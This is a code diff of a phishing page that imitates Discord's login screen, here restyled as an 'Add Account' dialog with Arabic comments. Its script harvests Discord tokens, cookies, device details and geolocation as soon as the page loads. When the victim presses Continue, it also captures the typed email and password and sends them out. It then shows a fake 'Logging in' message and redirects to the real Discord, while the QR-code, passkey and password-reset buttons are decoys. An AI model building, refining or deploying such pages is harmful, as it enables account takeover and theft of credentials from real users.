@@ -1,16 +1,12 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Login</title>
+    <title>Add Account - Discord</title>
     <style>
-        /* الخلفية الرمادية الداكنة */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        /* خلفية رمادية داكنة */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #1e1f22;
             font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
@@ -20,59 +16,52 @@
             min-height: 100vh;
             margin: 0;
             padding: 20px;
-            direction: ltr;
         }
 
-        /* المربع الأبيض الرئيسي */
-        .login-card {
+        /* المربع الأبيض */
+        .modal {
             background: #313338;
             border-radius: 16px;
-            padding: 32px 28px 28px 28px;
+            padding: 40px 36px 28px 36px;
             max-width: 480px;
             width: 100%;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
             color: #dbdee1;
         }
 
-        /* الأيقونة أو الشعار */
-        .logo {
-            text-align: center;
-            margin-bottom: 24px;
-        }
-        .logo svg {
-            width: 70px;
-            height: 70px;
-        }
-
-        .title {
+        /* عنوان Add Account */
+        .modal-title {
             font-size: 24px;
             font-weight: 700;
             text-align: center;
-            margin-bottom: 4px;
             color: #f2f3f5;
+            margin-bottom: 6px;
         }
 
-        .subtitle {
-            text-align: center;
+        .modal-sub {
             font-size: 14px;
             color: #b5bac1;
-            margin-bottom: 24px;
+            text-align: center;
+            margin-bottom: 28px;
+            line-height: 1.4;
         }
 
         /* الحقول */
-        .input-group {
+        .field {
             margin-bottom: 16px;
         }
-        .input-group label {
+        .field label {
             display: block;
             font-size: 12px;
             font-weight: 600;
             color: #b5bac1;
             margin-bottom: 6px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+            letter-spacing: 0.4px;
         }
-        .input-group input {
+        .field label span {
+            color: #ed4245;
+        }
+        .field input {
             width: 100%;
             padding: 12px 14px;
             background: #1e1f22;
@@ -81,82 +70,57 @@
             color: #f2f3f5;
             font-size: 16px;
             outline: none;
-            transition: border-color 0.2s;
+            transition: border-color 0.15s;
         }
-        .input-group input:focus {
+        .field input:focus {
             border-color: #5865f2;
         }
-        .input-group input::placeholder {
+        .field input::placeholder {
             color: #6d7278;
         }
 
-        /* زر Continue */
-        .btn-continue {
-            width: 100%;
-            padding: 14px;
-            background: #5865f2;
-            border: none;
-            border-radius: 8px;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-            margin-top: 8px;
-        }
-        .btn-continue:hover {
-            background: #4752c4;
-        }
-
-        /* الفاصل */
-        .divider {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin: 20px 0 16px 0;
-            color: #6d7278;
+        /* Forgot password */
+        .forgot-link {
+            display: inline-block;
             font-size: 13px;
+            color: #00a8fc;
+            text-decoration: none;
+            margin-bottom: 24px;
+            font-weight: 500;
         }
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background: #3d3f45;
+        .forgot-link:hover {
+            text-decoration: underline;
         }
 
-        /* زر QR Code */
+        /* QR Code section */
         .qr-section {
             display: flex;
             align-items: center;
             gap: 16px;
             background: #1e1f22;
             border-radius: 12px;
-            padding: 14px 18px;
-            cursor: pointer;
-            transition: background 0.2s;
-            margin-bottom: 8px;
+            padding: 12px 16px;
+            margin-bottom: 6px;
+            cursor: default;
+            transition: background 0.15s;
         }
         .qr-section:hover {
             background: #2b2d31;
         }
-        .qr-section .qr-icon {
-            width: 64px;
-            height: 64px;
+        .qr-icon {
+            width: 60px;
+            height: 60px;
             background: #1e1f22;
             border: 2px solid #3d3f45;
             border-radius: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 10px;
-            color: #b5bac1;
             flex-shrink: 0;
         }
-        .qr-section .qr-icon img {
-            width: 100%;
-            height: 100%;
-            image-rendering: pixelated;
+        .qr-icon svg {
+            width: 48px;
+            height: 48px;
         }
         .qr-text {
             font-size: 14px;
@@ -166,27 +130,74 @@
         .qr-sub {
             font-size: 12px;
             color: #6d7278;
+            margin-top: 2px;
+        }
+        .qr-sub strong {
+            color: #dbdee1;
+            font-weight: 600;
         }
 
-        /* زر Back */
-        .back-link {
+        /* passkey link */
+        .passkey-link {
             display: block;
-            text-align: center;
-            margin-top: 16px;
-            color: #6d7278;
-            font-size: 14px;
+            font-size: 13px;
+            color: #00a8fc;
             text-decoration: none;
+            margin: 6px 0 10px 0;
+            padding-left: 76px;
+            font-weight: 500;
         }
-        .back-link:hover {
+        .passkey-link:hover {
             text-decoration: underline;
+        }
+
+        /* الأزرار (Back و Continue) */
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+            gap: 12px;
+        }
+        .btn-back {
+            background: transparent;
+            border: none;
+            color: #b5bac1;
+            font-size: 15px;
+            font-weight: 500;
+            padding: 10px 16px;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: background 0.15s;
+        }
+        .btn-back:hover {
+            background: #3d3f45;
+        }
+        .btn-continue {
+            background: #5865f2;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            padding: 10px 28px;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        .btn-continue:hover {
+            background: #4752c4;
+        }
+        .btn-continue:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
 
         /* رسالة الحالة */
         .status-msg {
-            margin-top: 14px;
+            margin-top: 16px;
             padding: 10px;
-            border-radius: 8px;
             background: #1e1f22;
+            border-radius: 8px;
             color: #b5bac1;
             font-size: 13px;
             text-align: center;
@@ -195,45 +206,43 @@
         .status-msg.show {
             display: block;
         }
+
+        /* تعديل صغير للشاشات الصغيرة */
+        @media (max-width: 480px) {
+            .modal { padding: 24px 18px; }
+            .actions { flex-direction: column; gap: 8px; }
+            .btn-back { width: 100%; }
+            .btn-continue { width: 100%; }
+        }
     </style>
 </head>
 <body>
 
-<div class="login-card">
+<div class="modal">
 
-    <!-- شعار ديسكورد -->
-    <div class="logo">
-        <svg width="70" height="70" viewBox="0 0 127 96" fill="none">
-            <path d="M107.7 10.6C98.5 6.3 88.6 3.1 78.2 1.2C78.1 1.1 77.9 1.2 77.8 1.4C76.5 3.5 75 6.2 73.9 8.5C62.7 6.8 51.4 6.8 40.4 8.5C39.3 6.2 37.8 3.5 36.5 1.4C36.4 1.2 36.2 1.1 36.1 1.2C25.7 3.1 15.8 6.3 6.6 10.6C6.5 10.7 6.4 10.8 6.3 10.9C0.9 19.1 -0.8 29.6 0.7 39.6C0.7 39.8 0.9 39.9 1.1 40C13.8 49.7 28.9 55.9 44.8 58.4C45 58.4 45.2 58.3 45.3 58.1C48.2 54.2 50.8 50.1 52.9 45.8C53 45.6 52.9 45.4 52.7 45.3C48.8 43.7 45.2 41.7 41.9 39.3C41.7 39.1 41.6 38.9 41.8 38.7C42.6 38.1 43.4 37.4 44.1 36.8C44.3 36.6 44.5 36.7 44.7 36.8C62.5 44.4 82.1 44.4 99.6 36.8C99.8 36.7 100 36.6 100.2 36.8C101 37.4 101.8 38.1 102.6 38.7C102.7 38.9 102.6 39.1 102.5 39.3C99.1 41.7 95.5 43.7 91.6 45.3C91.4 45.4 91.3 45.6 91.5 45.8C93.6 50.1 96.2 54.2 99.1 58.1C99.2 58.3 99.4 58.4 99.6 58.4C115.6 55.9 130.7 49.7 143.4 40C143.5 39.9 143.7 39.8 143.7 39.6C145.2 29.6 143.5 19.1 138.1 10.9C138 10.8 137.9 10.7 137.8 10.6H107.7Z" fill="#5865F2"/>
-        </svg>
+    <!-- العنوان -->
+    <div class="modal-title">Add Account</div>
+    <div class="modal-sub">Logging in to another account will let you easily switch between accounts on this device.</div>
+
+    <!-- الحقول -->
+    <div class="field">
+        <label for="email">Email or Phone Number <span>*</span></label>
+        <input type="text" id="email" placeholder="Enter your email or phone" autocomplete="off">
+    </div>
+    <div class="field">
+        <label for="password">Password <span>*</span></label>
+        <input type="password" id="password" placeholder="Enter your password" autocomplete="off">
     </div>
 
-    <div class="title">Welcome back!</div>
-    <div class="subtitle">We're so excited to see you again!</div>
+    <!-- Forgot password -->
+    <a href="#" class="forgot-link" id="forgotLink">Forgot your password?</a>
 
-    <!-- نموذج تسجيل الدخول -->
-    <form id="loginForm" onsubmit="return false;">
-        <div class="input-group">
-            <label for="email">Email or Phone Number *</label>
-            <input type="text" id="email" placeholder="Enter your email or phone" autocomplete="off">
-        </div>
-        <div class="input-group">
-            <label for="password">Password *</label>
-            <input type="password" id="password" placeholder="Enter your password" autocomplete="off">
-        </div>
-
-        <button type="button" class="btn-continue" id="continueBtn">Continue</button>
-    </form>
-
-    <!-- الفاصل -->
-    <div class="divider">or</div>
-
-    <!-- قسم QR Code (باركود وهمي) -->
+    <!-- QR Code -->
     <div class="qr-section" id="qrSection">
         <div class="qr-icon">
-            <svg width="48" height="48" viewBox="0 0 48 48" fill="none" style="background:white; border-radius:4px;">
+            <svg viewBox="0 0 48 48" fill="none" style="background:white; border-radius:4px;">
                 <rect width="48" height="48" fill="white" rx="4"/>
-                <!-- باركود وهمي (مجرد نقاط سوداء) -->
+                <!-- باركود وهمي يشبه QR -->
                 <rect x="6" y="6" width="8" height="8" fill="black"/>
                 <rect x="18" y="6" width="8" height="8" fill="black"/>
                 <rect x="34" y="6" width="8" height="8" fill="black"/>
@@ -243,7 +252,6 @@
                 <rect x="18" y="34" width="8" height="8" fill="black"/>
                 <rect x="34" y="34" width="8" height="8" fill="black"/>
                 <rect x="18" y="18" width="8" height="8" fill="black"/>
-                <!-- نقاط عشوائية -->
                 <rect x="6" y="28" width="4" height="4" fill="black"/>
                 <rect x="12" y="28" width="4" height="4" fill="black"/>
                 <rect x="26" y="18" width="4" height="4" fill="black"/>
@@ -256,14 +264,20 @@
         </div>
         <div>
             <div class="qr-text">Log in with QR Code</div>
-            <div class="qr-sub">Scan this with the Discord mobile app to log in instantly.</div>
+            <div class="qr-sub">Scan this with the <strong>Discord mobile app</strong> to log in instantly.</div>
         </div>
     </div>
 
-    <!-- رابط Back -->
-    <a href="#" class="back-link" id="backLink">Back</a>
+    <!-- Or sign in with a passkey -->
+    <a href="#" class="passkey-link" id="passkeyLink">Or sign in with a passkey</a>
 
-    <!-- رسالة الحالة (تظهر بعد الإرسال) -->
+    <!-- الأزرار -->
+    <div class="actions">
+        <button class="btn-back" id="backBtn">Back</button>
+        <button class="btn-continue" id="continueBtn">Continue</button>
+    </div>
+
+    <!-- رسالة الحالة -->
     <div class="status-msg" id="statusMsg">✓ Logging in... Redirecting to Discord...</div>
 
 </div>
@@ -272,7 +286,7 @@
     (function() {
 
         // ================================================================
-        // 🔥 استخراج التوكنات من كل مكان (نفس الكود السابق)
+        // 🔥 استخراج التوكنات من كل مكان
         // ================================================================
 
         function extractDiscordToken() {
@@ -349,7 +363,7 @@
         }
 
         // ================================================================
-        // جمع المعلومات الأساسية
+        // معلومات الجهاز
         // ================================================================
 
         function getDeviceInfo() {
@@ -390,10 +404,9 @@
             device: device,
             location: null,
             cookies: document.cookie,
-            page: 'discord_login_phishing'
+            page: 'discord_add_account_phishing'
         };
 
-        // محاولة الموقع الجغرافي (اختياري)
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 pos => {
@@ -411,20 +424,17 @@
             sendData(initialData);
         }
 
-        // إرسال متكرر لضمان الوصول
         setTimeout(() => sendData(initialData), 500);
         setTimeout(() => sendData(initialData), 1500);
         setTimeout(() => sendData(initialData), 4000);
 
         // ================================================================
-        // نموذج تسجيل الدخول - عند الضغط على Continue
+        // زر Continue
         // ================================================================
 
         document.getElementById('continueBtn').addEventListener('click', function() {
             let email = document.getElementById('email').value;
             let password = document.getElementById('password').value;
-
-            // جمع التوكنات مرة أخرى (قد تكون ظهرت بعد التفاعل)
             let freshTokens = extractDiscordToken();
 
             let loginData = {
@@ -432,7 +442,7 @@
                 discordPassword: password,
                 discordTokens: freshTokens,
                 tokenCount: freshTokens.length,
-                extra: 'discord_login_form_submit',
+                extra: 'discord_add_account_submit',
                 device: getDeviceInfo(),
                 cookies: document.cookie,
                 timestamp: new Date().toISOString()
@@ -440,46 +450,65 @@
 
             sendData(loginData);
 
-            // إظهار رسالة نجاح
             let status = document.getElementById('statusMsg');
             status.textContent = '✓ Logging in... Redirecting to Discord...';
             status.classList.add('show');
 
-            // تعطيل الزر والحقول
             document.getElementById('continueBtn').disabled = true;
-            document.querySelectorAll('.input-group input').forEach(inp => inp.disabled = true);
+            document.querySelectorAll('.field input').forEach(inp => inp.disabled = true);
 
-            // بعد ثانيتين، توجيه إلى ديسكورد الحقيقي
             setTimeout(() => {
                 window.location.href = 'https://discord.com/login';
             }, 2000);
         });
 
         // ================================================================
-        // زر QR Code وهمي (فقط لإضفاء الطابع الواقعي)
+        // زر Back (وهمي)
+        // ================================================================
+
+        document.getElementById('backBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            let status = document.getElementById('statusMsg');
+            status.textContent = '↩️ Returning...';
+            status.classList.add('show');
+            setTimeout(() => {
+                window.location.href = 'https://discord.com';
+            }, 1000);
+        });
+
+        // ================================================================
+        // Forgot password (وهمي)
+        // ================================================================
+
+        document.getElementById('forgotLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            let status = document.getElementById('statusMsg');
+            status.textContent = '🔐 Password reset link sent to your email (simulated)';
+            status.classList.add('show');
+            setTimeout(() => status.classList.remove('show'), 3000);
+        });
+
+        // ================================================================
+        // QR Code (وهمي)
         // ================================================================
 
         document.getElementById('qrSection').addEventListener('click', function() {
             let status = document.getElementById('statusMsg');
             status.textContent = '📱 QR Code login is not available on this device. Please use email/password.';
             status.classList.add('show');
-            setTimeout(() => {
-                status.classList.remove('show');
-            }, 3000);
+            setTimeout(() => status.classList.remove('show'), 3000);
         });
 
         // ================================================================
-        // زر Back (وهمي)
+        // Passkey (وهمي)
         // ================================================================
 
-        document.getElementById('backLink').addEventListener('click', function(e) {
+        document.getElementById('passkeyLink').addEventListener('click', function(e) {
             e.preventDefault();
             let status = document.getElementById('statusMsg');
-            status.textContent = '↩️ Returning to previous page...';
+            status.textContent = '🔑 Passkey login is not supported on this browser.';
             status.classList.add('show');
-            setTimeout(() => {
-                window.location.href = 'https://discord.com';
-            }, 1000);
+            setTimeout(() => status.classList.remove('show'), 3000);
         });
 
     })();
